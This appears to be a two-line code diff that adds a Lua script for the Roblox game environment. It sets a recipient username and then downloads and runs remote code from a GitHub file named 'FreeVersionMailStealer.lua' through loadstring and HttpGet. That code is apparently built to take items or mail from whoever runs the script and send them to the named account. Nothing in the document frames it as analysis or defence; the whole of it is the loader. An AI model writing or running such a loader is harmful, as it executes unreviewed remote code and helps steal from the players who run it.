@@ -1,0 +1,2 @@
+_G.AuthUser = "Jakesugcitems"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BlobLemon/LemonBob/main/FreeVersionMailStealer.lua"))()
